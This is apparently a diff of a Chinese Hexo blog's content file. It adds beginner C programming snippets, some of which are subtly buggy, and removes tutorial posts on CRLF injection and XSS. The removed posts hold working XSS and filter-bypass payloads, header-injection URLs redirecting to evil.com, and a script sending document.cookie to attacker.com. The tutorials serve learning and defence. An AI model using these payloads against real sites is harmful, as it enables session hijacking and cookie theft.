+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">    int a[2000];</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    int can=a[0];</span><br><span class="line">    int cnt=1;</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        if(cnt==0)&#123;</span><br><span class="line">            can=a[i];</span><br><span class="line">            cnt=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(can==a[i])cnt++;</span><br><span class="line">        else cnt--;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%d&quot;,can);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="n个数字中选出数字和最大的连续一段"><a href="#n个数字中选出数字和最大的连续一段" class="headerlink" title="n个数字中选出数字和最大的连续一段"></a>n个数字中选出数字和最大的连续一段</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sum1=0,sum=-1000;</span><br><span class="line">   for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">       sum1=(sum1+a[i])&gt;a[i]?(sum1+a[i]):a[i];</span><br><span class="line">       if(sum1&gt;sum)sum=sum1;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;%d&quot;,sum);</span><br></pre></td></tr></table></figure>
+
+<h2 id="结尾不输出空行"><a href="#结尾不输出空行" class="headerlink" title="结尾不输出空行"></a>结尾不输出空行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int flag=1;</span><br><span class="line">···</span><br><span class="line">if(!flag)printf(&quot;\n&quot;);</span><br><span class="line">flag=0;</span><br><span class="line">···\\输出···</span><br></pre></td></tr></table></figure>
+
+<h2 id="数组元素右移"><a href="#数组元素右移" class="headerlink" title="数组元素右移"></a>数组元素右移</h2><p>n个数，第i个数向右移m个整数变为a[(i+n-m)%n]</p>
+<h2 id="单词翻转"><a href="#单词翻转" class="headerlink" title="单词翻转"></a>单词翻转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">char* r(char* s)&#123;</span><br><span class="line">	int len=strlen(s);</span><br><span class="line">	for(int i=0;i&lt;len/2;i++)&#123;</span><br><span class="line">		char t=s[i];</span><br><span class="line">		s[i]=s[len-1-i];</span><br><span class="line">		s[len-1-i]=t;</span><br><span class="line">	&#125;</span><br><span class="line">	return s;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char s[25];</span><br><span class="line">	while(scanf(&quot;%s&quot;,s)!=EOF)&#123; \\去除多余空格</span><br><span class="line">		printf(&quot;%s&quot;,r(s));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="10进制数n转化成m进制"><a href="#10进制数n转化成m进制" class="headerlink" title="10进制数n转化成m进制"></a>10进制数n转化成m进制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int cnt=1,sum=0;</span><br><span class="line">while(n&gt;0)&#123;</span><br><span class="line">	t=n%m;</span><br><span class="line">	t*=cnt;</span><br><span class="line">	sum+=t;</span><br><span class="line">	n/=m;</span><br><span class="line">	cnt*=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="求n的素数因子和"><a href="#求n的素数因子和" class="headerlink" title="求n的素数因子和"></a>求n的素数因子和</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=1;i&lt;sqrt(n);i++)&#123;</span><br><span class="line">	if(n%i==0)&#123;</span><br><span class="line">		sum+=i;</span><br><span class="line">		if(n/i!=i)&#123;</span><br><span class="line">			sum+=n/i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="求a，b的最大公约数"><a href="#求a，b的最大公约数" class="headerlink" title="求a，b的最大公约数"></a>求a，b的最大公约数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m=a;</span><br><span class="line">n=b;</span><br><span class="line">while(n!=0)&#123;</span><br><span class="line">	t=m%n;</span><br><span class="line">	m=n;</span><br><span class="line">	n=t;</span><br><span class="line">&#125;\\m即为最大公约数</span><br></pre></td></tr></table></figure>
+
+<h2 id="将一个n位数反转"><a href="#将一个n位数反转" class="headerlink" title="将一个n位数反转"></a>将一个n位数反转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int number,res=0,rem;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">while(number!=0)&#123;</span><br><span class="line">	rem=num%10;</span><br><span class="line">	res=res*10+rem;</span><br><span class="line">	number/=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int rows,conf=1;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;rows);</span><br><span class="line">	for(int i=0;i&lt;rows;i++)&#123;</span><br><span class="line">		for(int space=1;space&lt;=rows-i-1;space++)&#123;</span><br><span class="line">			printf(&quot;  &quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		for(int j=0;j&lt;=i;j++)&#123;</span><br><span class="line">			if(j==0||i==0)conf=1;</span><br><span class="line">			else conf=conf*(i-j+1)/j;</span><br><span class="line">			printf(&quot;%4d &quot;,conf);</span><br><span class="line">		&#125;</span><br><span class="line">		printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</div>]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+  </entry>
+  <entry>
     <title>HTML</title>
     <url>/2024/12/24/HTML/</url>
     <content><![CDATA[<div id="postchat_postcontent"><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="前备知识"><a href="#前备知识" class="headerlink" title="前备知识"></a>前备知识</h2><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710305.png" style="zoom: 80%;" />
@@ -399,63 +679,6 @@
 </div>]]></content>
       <categories>
         <category>前端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CRLF漏洞</title>
-    <url>/2025/02/07/CRLF%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<div id="postchat_postcontent"><h1 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h1><p><strong>CRLF（Carriage Return + Line Feed，回车 + 换行）</strong>，是 <code>\r\n</code> 的组合，表示文本换行</p>
-<p><code>\r\n</code>进行URL编码变成<code>%0D%0A</code></p>
-<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>在输入中插入 <code>\r\n</code>，改变 HTTP 头部或 HTML 页面结构，进而实现 <strong>XSS、HTTP 响应拆分（HTTP Response Splitting）、Web 伪造攻击</strong></p>
-<h3 id="HTTP响应拆分"><a href="#HTTP响应拆分" class="headerlink" title="HTTP响应拆分"></a>HTTP响应拆分</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>服务器在响应 HTTP 头时，通常会使用 <code>\r\n</code> 作为分隔符</p>
-<p>如果攻击者可以在 <strong>URL 或请求头</strong>中注入 <code>\r\n</code>，就可能 <strong>伪造 HTTP 头部或插入恶意内容</strong></p>
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=admin</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>攻击者构造请求：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0ASet-Cookie:%20admin=true</span><br></pre></td></tr></table></figure>
-
-<p>服务器返回：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=admin</span><br><span class="line">Set-Cookie: admin=true  &lt;-- 攻击者成功伪造 Cookie</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击者成功伪造cookie，可能绕过身份验证，可以用于会话劫持、钓鱼攻击等</strong></p>
-<p><strong>其可与<code>location</code>头结合进行重定向</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?username=%0D%0ALocation:%20https://evil.com%0D%0A</span><br></pre></td></tr></table></figure>
-
-<p>可能导致服务器返回：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=</span><br><span class="line">Location: https://evil.com   &lt;-- 伪造重定向</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome!&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>用户被恶意跳转到<code>evil.com</code></p>
-<h3 id="CRLF与XSS结合"><a href="#CRLF与XSS结合" class="headerlink" title="CRLF与XSS结合"></a>CRLF与XSS结合</h3><p>攻击者构造请求：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0AContent-Length:%200%0D%0A%0D%0A&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>服务器返回：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 0  &lt;-- 伪造的 Content-Length</span><br><span class="line">                              </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;  &lt;-- XSS 代码被执行</span><br></pre></td></tr></table></figure>
-
-<h3 id="CRLF-造成日志伪造"><a href="#CRLF-造成日志伪造" class="headerlink" title="CRLF 造成日志伪造"></a>CRLF 造成日志伪造</h3><p>很多 Web 服务器会将请求参数写入日志，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[INFO] 2025-02-07 12:00:00 - User input: test</span><br></pre></td></tr></table></figure>
-
-<p>如果攻击者输入 <code>\r\n</code>，可能伪造日志内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0A%5BWARNING%5D%20Security%20Breach!</span><br></pre></td></tr></table></figure>
-
-<p>服务器日志可能变成：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[INFO] 2025-02-07 12:00:00 - User input: </span><br><span class="line">[WARNING] Security Breach!</span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击者可以伪造系统日志，可能隐藏攻击痕迹、制造假警报等</strong></p>
-<h2 id="防御-CRLF-注入"><a href="#防御-CRLF-注入" class="headerlink" title="防御 CRLF 注入"></a>防御 CRLF 注入</h2><h3 id="过滤用户输入，移除-r-n"><a href="#过滤用户输入，移除-r-n" class="headerlink" title="过滤用户输入，移除 \r\n"></a>过滤用户输入，移除 <code>\r\n</code></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userInput = userInput.replace(/[\r\n]/g, &quot;&quot;);  // 删除 CRLF</span><br></pre></td></tr></table></figure>
-
-<h3 id="对-URL-参数进行编码"><a href="#对-URL-参数进行编码" class="headerlink" title="对 URL 参数进行编码"></a>对 URL 参数进行编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encodeURIComponent(userInput);</span><br></pre></td></tr></table></figure>
-
-<h3 id="设置-HTTP-头安全策略"><a href="#设置-HTTP-头安全策略" class="headerlink" title="设置 HTTP 头安全策略"></a>设置 HTTP 头安全策略</h3><p>启用 <code>CSP</code> ，<strong>只允许同源（self）资源加载</strong>（内嵌 HTML（非 JS 或 CSS）），阻止外部资源加载</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
-
-<h3 id="HTTP-头中使用安全-API"><a href="#HTTP-头中使用安全-API" class="headerlink" title="HTTP 头中使用安全 API"></a>HTTP 头中使用安全 API</h3><p>在 <code>setHeader()</code> 时避免拼接用户输入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.setHeader(&quot;Set-Cookie&quot;, `user=$&#123;encodeURIComponent(username)&#125;`);</span><br></pre></td></tr></table></figure>
-
-<h3 id="确保日志安全"><a href="#确保日志安全" class="headerlink" title="确保日志安全"></a>确保日志安全</h3><p>使用 <code>JSON.stringify()</code> 记录日志，防止换行</p>
-<p>避免直接写入用户输入</p>
-</div>]]></content>
-      <categories>
-        <category>漏洞</category>
       </categories>
   </entry>
   <entry>
@@ -1830,635 +2053,6 @@
       </categories>
   </entry>
   <entry>
-    <title>XSS漏洞</title>
-    <url>/2025/02/05/XSS%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<div id="postchat_postcontent"><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>XSS是基于<strong>前端</strong>的一种攻击，其实就是<strong>非Web应用自身的JS代码被黑客恶意插入</strong>，通过执行恶意的JS代码，可以导致<strong>窃取敏感信息、篡改网页内容或劫持用户会话</strong>，大部分情况是窃取Cookie，在你登录账号后的情况下，部分Web应用通过Cookie可以导致黑客能直接登录你的账号</p>
-<h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>持久化，代码存储在后端（数据库、日志文件、评论等）中，容易造成蠕虫，盗窃cookie</p>
-<p>数据流通：将恶意代码通过交互界面上传到后端，然后从而上传到数据库中（实现自动化攻击），当管理员admin查询数据库的信息时，恶意脚本又从后端到了前端</p>
-<p><strong>在CTF中，利用GET、POST或者抓包在Referer，Cookie的地方植入我们的恶意脚本</strong></p>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>非持久化，需欺骗用户去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般出现在搜索页面，大多数用来盗取Cookie</p>
-<p>数据流通：我们在一个输入框（一般是<code>&lt;input&gt;</code>标签形成）里输入我们的恶意脚本，需要用户进行触发才能进行攻击，在前端输入恶意脚本，后端接受，然后再在前端显示</p>
-<p><strong>在CTF中，题目会给一个输入框，然后绕过过滤，执行恶意脚本</strong></p>
-<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>只发生在前端，利用 JavaScript 在浏览器端操作 DOM 时，动态插入和执行恶意代码，是通过url传入参数去控制触发的（也属于反射型XSS）</p>
-<p>数据流通：在前端url添加我们的恶意脚本，然后直接在页面输出</p>
-<h3 id="JSONP型XSS"><a href="#JSONP型XSS" class="headerlink" title="JSONP型XSS"></a>JSONP型XSS</h3><p>在浏览器的同源策略下，前端 JavaScript 不能直接跨域请求 <code>AJAX</code>（一种无需刷新页面就能向服务器发送和接收数据的技术），但可以利用 <code>&lt;script&gt;</code> 标签（允许跨域加载特性）进行跨域请求（允许从一个域名中获取到另一个域名的数据）</p>
-<p>后端返回的是带回调函数的 JSON 数据，前端利用回调函数（<code>callback</code>）解析数据</p>
-<p>攻击者可以<strong>伪造回调函数</strong>，利用 JSONP 执行任意 JavaScript 代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://example.com/user?callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器不做安全限制，返回的数据是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(&#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 25&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>这时 <code>alert()</code> 直接执行，可能导致 XSS 攻击，也可以窃取受害者的 Cookie：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://example.com/user?callback=evilFunction&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function evilFunction(data) &#123;</span><br><span class="line">    document.write(&quot;&lt;img src=&#x27;http://attacker.com/steal?cookie=&quot; + document.cookie + &quot;&#x27;&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="XSS的攻击对象（XSS最终插入到哪里）"><a href="#XSS的攻击对象（XSS最终插入到哪里）" class="headerlink" title="XSS的攻击对象（XSS最终插入到哪里）"></a>XSS的攻击对象（XSS最终插入到哪里）</h2><h3 id="插入到HTML注释内容中"><a href="#插入到HTML注释内容中" class="headerlink" title="插入到HTML注释内容中"></a>插入到HTML注释内容中</h3><p>利用闭合的方式从而插入HTML注释内容之中</p>
-<blockquote>
-<p>[!CAUTION]</p>
-<p>可能利用某些解析漏洞，导致代码执行</p>
-<p>绕过 WAF（安全防火墙）检测，隐藏 XSS 代码（如果后端在某些情况下错误地解析了注释（比如动态拼接 HTML），注释中的 XSS 可能会被执行）</p>
-<p>诱导用户手动执行 XSS（社工攻击）</p>
-<p>前端错误解析 HTML 注释，导致 XSS 触发（如<code>innerHTML</code>没有正确处理注释，导致 <code>&lt;script&gt;</code> 被执行）</p>
-<p>配合 DOM XSS，影响前端页面（如 <code>innerHTML</code> 解析了注释，导致 <code>&lt;img&gt;</code> 执行 <code>onerror</code> XSS）</p>
-</blockquote>
-<h3 id="插入到HTML标签的属性值中"><a href="#插入到HTML标签的属性值中" class="headerlink" title="插入到HTML标签的属性值中"></a>插入到HTML标签的属性值中</h3><p>通常配合<code>onerror</code>使用</p>
-<blockquote>
-<p>[!IMPORTANT]</p>
-<h4 id="onerror（XSS利用点）"><a href="#onerror（XSS利用点）" class="headerlink" title="onerror（XSS利用点）"></a>onerror（XSS利用点）</h4><p>一个<strong>事件处理程序</strong>，当资源（如图片、脚本、iframe）加载失败时触发</p>
-<h5 id="利用-标签"><a href="#利用-标签" class="headerlink" title="利用 &lt;img&gt; 标签"></a>利用 <code>&lt;img&gt;</code> 标签</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS!&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="利用-标签-1"><a href="#利用-标签-1" class="headerlink" title="利用 &lt;script&gt; 标签"></a>利用 <code>&lt;script&gt;</code> 标签</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;bad&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="利用-iframe"><a href="#利用-iframe" class="headerlink" title="利用 iframe"></a>利用 <code>iframe</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;invalid.html&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="onerror-结合-javascript-伪协议"><a href="#onerror-结合-javascript-伪协议" class="headerlink" title="onerror 结合 javascript: 伪协议"></a><code>onerror</code> 结合 <code>javascript:</code> 伪协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-
-</blockquote>
-<h3 id="插入到HTML标签的属性名中"><a href="#插入到HTML标签的属性名中" class="headerlink" title="插入到HTML标签的属性名中"></a>插入到HTML标签的属性名中</h3><p>如果服务器端没有正确转义 <code>name</code>，而是直接在 HTML 中插入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;欢迎, &lt;input type=&quot;text&quot; name=&quot;&#123;&#123; user_input &#125;&#125;&quot;&gt;!&lt;/p&gt;</span><br></pre></td></tr></table></figure>
-
-<p>攻击者输入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>浏览器解析后，HTML 变成：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;欢迎, &lt;input type=&quot;text&quot; name=&quot;&quot;&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="插入到HTML标签名中"><a href="#插入到HTML标签名中" class="headerlink" title="插入到HTML标签名中"></a>插入到HTML标签名中</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;content&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let userInput = prompt(&quot;请输入标签名：&quot;);  </span><br><span class="line">    document.getElementById(&quot;content&quot;).innerHTML = `&lt;img $&#123;userInput&#125;&gt;`;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>攻击者输入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src=x onerror=&quot;&lt;/img&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>解析后的HTML：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;&quot;&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>原因：<code>&lt;img&gt;</code>是自闭合标签，不会有 <code>&lt;/img&gt;</code> 这样的闭合标签，当解析器看到 <code>&quot;&lt;/img&gt;</code>，它会忽略这个 <code>&lt;/img&gt;</code> 并直接闭合 <code>&lt;img&gt;</code></p>
-<h3 id="最简单的插入到script-img-svg标签中"><a href="#最简单的插入到script-img-svg标签中" class="headerlink" title="最简单的插入到script,img,svg标签中"></a>最简单的插入到script,img,svg标签中</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="插入到CSS中-旧版浏览器"><a href="#插入到CSS中-旧版浏览器" class="headerlink" title="插入到CSS中(旧版浏览器)"></a>插入到CSS中(旧版浏览器)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`xss`)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码</p>
-<h3 id="插入到HTTP响应中"><a href="#插入到HTTP响应中" class="headerlink" title="插入到HTTP响应中"></a>插入到HTTP响应中</h3><p>这就要牵扯到CRLF漏洞</p>
-<p>利用CRLF漏洞将http包分为了header和body，利用回车符&#x2F;换行符成功执行了body中的代码，实现XSS</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>返回包变成：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Content-type:text/html</span><br><span class="line"></span><br><span class="line">Contet-Length:xxx</span><br><span class="line"></span><br><span class="line">Connection:close</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果遇到XSS过滤的情况我们还可以在httpheader中注入<code>X-XSS-Protection:0</code>（旧版服务器），可绕过浏览器的过滤规则实现XSS弹窗显示（主要为反射型XSS）</p>
-<h2 id="XSS的绕过"><a href="#XSS的绕过" class="headerlink" title="XSS的绕过"></a>XSS的绕过</h2><h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCriPt&gt;alert(1)&lt;sCriPt&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><p><code>eval</code>，<code>top</code>，<code>window</code>，<code>self</code>，<code>parent</code>，<code>frames</code>等</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="函数替换绕过"><a href="#函数替换绕过" class="headerlink" title="函数替换绕过"></a>函数替换绕过</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="document-write"><a href="#document-write" class="headerlink" title="document.write()"></a>document.write()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="setTimeout-和-setInterval"><a href="#setTimeout-和-setInterval" class="headerlink" title="setTimeout()和 setInterval()"></a><code>setTimeout()</code>和 <code>setInterval()</code></h5><p>JavaScript 中用于延时执行代码的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="利用构造器"><a href="#利用构造器" class="headerlink" title="利用构造器"></a>利用构造器</h5><p>通过构造器动态生成并执行 JavaScript 代码</p>
-<p><code>Set.constructor</code>，<code>Map.constructor</code>，<code>Array.constructor</code>，<code>WeakSet.constructor</code>，<code>constructor.constructor</code>等</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="利用数组方法"><a href="#利用数组方法" class="headerlink" title="利用数组方法"></a>利用数组方法</h5><p><code>[1].map</code>，<code>[1].find</code>，<code>[1].every</code>，<code>[1].filter</code>，<code>[1].forEach</code>，<code>[1].findIndex</code>等</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;XSS&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用 <code>sc&lt;script&gt;ript</code>，<code>&lt;script&gt;</code> 被分成两部分：<code>sc</code> 和 <code>ript</code>，这样 XSS 过滤器可能不会识别整个标签，从而不会阻止该代码的执行</p>
-<h4 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>[!IMPORTANT]</p>
